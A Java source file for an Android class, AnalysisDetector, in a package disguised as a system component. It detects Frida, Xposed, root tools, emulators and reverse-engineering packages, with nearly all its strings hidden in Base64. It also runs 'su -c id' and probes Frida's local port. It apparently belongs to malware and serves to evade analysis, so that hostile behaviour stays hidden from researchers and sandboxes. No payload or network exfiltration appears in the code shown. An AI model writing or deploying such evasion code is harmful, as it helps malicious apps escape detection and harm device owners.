package com.android.system.qspaas;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

public class AnalysisDetector {

    private final Context context;
    private Boolean isAnalysisEnv = null; // Cache

    private static final Set<String> ANALYSIS_PACKAGES = new HashSet<>(Arrays.asList(
            StrUtil.d("Y29tLmZyaWRhLnNlcnZlcg=="), // com.frida.server
            StrUtil.d("Y29tLnhwb3NlZC5pbnN0YWxsZXI="), // com.xposed.installer
            StrUtil.d("ZGUucm9idi5hbmRyb2lkLnhwb3NlZC5pbnN0YWxsZXI="), // de.robv.android.xposed.installer
            StrUtil.d("Y29tLmFuZHJvaWQudmVuZGluZy5iaWxsaW5nLklJbkFwcEJpbGxpbmdTZXJ2aWNl"),
            StrUtil.d("Y29tLmFuZHJvaWQuc3lzdGVtdWkuZGVtbw=="), // com.android.systemui.demo
            StrUtil.d("Y29tLmdvb2dsZS5hbmRyb2lkLmdtcy5zYW5kYm94"), // com.google.android.gms.sandbox
            StrUtil.d("Y29tLmFuZHJvaWQuZW11bGF0b3IubmF0aXZlYnJpZGdl"),
            StrUtil.d("Y29tLmFuZHJvaWQuZW11bGF0b3IucWVtdS5rZXJuZWw="),
            StrUtil.d("Y29tLmFuZHJvaWQuZW11bGF0b3IucWVtdS5zeXN0ZW0="),
            StrUtil.d("Y29tLmFuZHJvaWQuZW11bGF0b3IucWVtdS52ZW5kb3I="),
            StrUtil.d("Y29tLmFuZHJvaWQuZGVidWdici5kZ2U="), // com.android.debugbr.dge
            StrUtil.d("Y29tLmFuZHJvaWQuYWRi"), // com.android.adb
            StrUtil.d("Y29tLmFuZHJvaWQuZGRtcw=="), // com.android.ddms
            StrUtil.d("Y29tLnRvcGpvbmh3dS5tYWdpcms="), // com.topjohnwuh.magisk (typo fix assumed)
            StrUtil.d("Y29tLmtvdXNoaWtkaHV0dGEuc3VwZXJ1c2Vy"), // com.koushikdutta.superuser
            StrUtil.d("ZXUuY2hhaW5maXJlLnN1cGVyc3U="), // eu.chainfire.supersu
            StrUtil.d("Y29tLmFuZHJvaWQuYXBrdG9vbA=="), // com.android.apktool
            StrUtil.d("Y29tLmFuZHJvaWQuYmFrc21hbGk="), // com.android.baksmali
            StrUtil.d("Y29tLmFuZHJvaWQuc21hbGk=") // com.android.smali
    ));

    private static final Set<String> ANALYSIS_FILES = new HashSet<>(Arrays.asList(
            StrUtil.d("L3N5c3RlbS94cG9zZWQucHJvcA=="), // /system/xposed.prop
            StrUtil.d("L3N5c3RlbS9hcHAvWHBvc2VkSW5zdGFsbGVy"), // /system/app/XposedInstaller
            StrUtil.d("L3N5c3RlbS9wcml2LWFwcC9YcG9zZWQySW5zdGFsbGVy"),
            StrUtil.d("L2RhdGEveHBvc2Vk"), // /data/xposed
            StrUtil.d("L2RhdGEvYWRiL21vZHVsZXM="), // /data/adb/modules
            StrUtil.d("L2RhdGEvYWRiL21hZ2lzaw=="), // /data/adb/magisk
            StrUtil.d("L3N5c3RlbS9saWIvbGliZnJpZGEuc28="), // /system/lib/libfrida.so (CORRIGIDO)
            StrUtil.d("L3N5c3RlbS9saWI2NC9saWJmcmlkYS5zbw=="), // /system/lib64/libfrida.so (CORRIGIDO)
            StrUtil.d("L3N5c3RlbS9saWIvbGlic3Vic3RyYXRlLnNv"),
            StrUtil.d("L3N5c3RlbS9saWI2NC9saWJzdWJzdHJhdGUuc28="),
            StrUtil.d("L3N5c3RlbS9hcHAvU3VwZXJ1c2VyLmFwaw=="),
            StrUtil.d("L3N5c3RlbS9hcHAvU3VwZXJTVUkuYXBr"),
            StrUtil.d("L3N5c3RlbS9iaW4vc3U="),
            StrUtil.d("L3N5c3RlbS94YmluL3N1"),
            StrUtil.d("L2RhdGEvbG9jYWwvdG1wL2ZyaWRhLXNlcnZlcg==")
    ));

    public AnalysisDetector(Context context) {
        this.context = context;
    }

    public boolean isAnalysisEnvironment() {
        if (isAnalysisEnv != null) return isAnalysisEnv;

        boolean detected = detectFrida() ||
                detectXposed() ||
                detectRoot() ||
                detectEmulator() ||
                detectInstalledPackages();

        isAnalysisEnv = detected;
        return detected;
    }

    private boolean detectInstalledPackages() {
        try {
            PackageManager pm = context.getPackageManager();
            for (String pkg : ANALYSIS_PACKAGES) {
                try {
                    ApplicationInfo info = pm.getApplicationInfo(pkg, 0);
                    if (info != null) return true;
                } catch (PackageManager.NameNotFoundException ignored) {}
            }
        } catch (Exception ignored) {}
        return false;
    }

    private boolean detectEmulator() {
        String fingerprint = getSystemProperty("ro.build.fingerprint");
        String model = getSystemProperty("ro.build.model");
        String product = getSystemProperty("ro.product.name");
        String hardware = getSystemProperty("ro.hardware");
        String qemu = getSystemProperty("ro.kernel.qemu");

        if (fingerprint != null && fingerprint.contains(StrUtil.d("Z2VuZXJpYw=="))) return true; // generic
        if (model != null && model.contains(StrUtil.d("R2VueW1vdGlvbg=="))) return true; // Genymotion
        if (qemu != null && qemu.equals(StrUtil.d("MQ=="))) return true; // 1
        if (hardware != null && (hardware.equals(StrUtil.d("Z29sZGZpc2g=")) || hardware.equals(StrUtil.d("cmFuY2h1")))) return true; // goldfish, ranchu
        if (product != null && (product.contains(StrUtil.d("Z2VuZXJpYw==")) || product.contains(StrUtil.d("ZW11bGF0b3I=")))) return true; // generic, emulator

        if (new File(StrUtil.d("L3N5c3RlbS9saWIvbGlicWVtdS5zbw==")).exists() ||
                new File(StrUtil.d("L3N5c3RlbS9saWI2NC9saWJxdWVtdS5zbw==")).exists()) { // libqemu.so (CORRIGIDO)
            return true;
        }
        return false;
    }

    private boolean detectRoot() {
        String[] paths = {StrUtil.d("L3N5c3RlbS9iaW4vc3U="), StrUtil.d("L3N5c3RlbS94YmluL3N1"), StrUtil.d("L2RhdGEvbG9jYWwvdG1wL3N1")};
        for (String path : paths) {
            if (new File(path).exists()) return true;
        }
        try {
            Process p = Runtime.getRuntime().exec(StrUtil.d("c3UgLWMgaWQ=")); // su -c id
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = reader.readLine();
            reader.close();
            if (line != null && line.contains("uid=0")) return true;
        } catch (Exception ignored) {}
        return false;
    }

    public boolean detectFrida() {
        // Verificação por arquivos (mais seguro que loadLibrary)
        if (new File(StrUtil.d("L3N5c3RlbS9saWIvbGliZnJpZGEuc28=")).exists()) return true;
        if (new File(StrUtil.d("L3N5c3RlbS9saWI2NC9saWJmcmlkYS5zbw==")).exists()) return true;

        // Verificação por processo
        try {
            Process process = Runtime.getRuntime().exec("ps");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains(StrUtil.d("ZnJpZGE="))) { // frida
                    reader.close();
                    return true;
                }
            }
            reader.close();
        } catch (Exception ignored) {}

        // Verificação por porta padrão (27042)
        try {
            java.net.Socket socket = new java.net.Socket();
            socket.connect(new java.net.InetSocketAddress("127.0.0.1", 27042), 1000);
            socket.close();
            return true;
        } catch (Exception ignored) {}

        return false;
    }

    public boolean detectXposed() {
        try {
            Class.forName(StrUtil.d("ZGUucm9idi5hbmRyb2lkLnhwb3NlZC5YcG9zZWRIZWxwZXJz"));
            return true;
        } catch (ClassNotFoundException ignored) {}

        if (new File(StrUtil.d("L3N5c3RlbS94cG9zZWQucHJvcA==")).exists()) return true;
        return false;
    }

    public boolean detectDebugger() {
        return android.os.Debug.isDebuggerConnected();
    }

    private String getSystemProperty(String propName) {
        try {
            Class<?> sysProps = Class.forName(StrUtil.d("YW5kcm9pZC5vcy5TeXN0ZW1Qcm9wZXJ0aWVz"));
            java.lang.reflect.Method get = sysProps.getDeclaredMethod(StrUtil.d("Z2V0"), String.class);
            get.setAccessible(true);
            return (String) get.invoke(null, propName);
        } catch (Exception ignored) {}
        return null;
    }
}
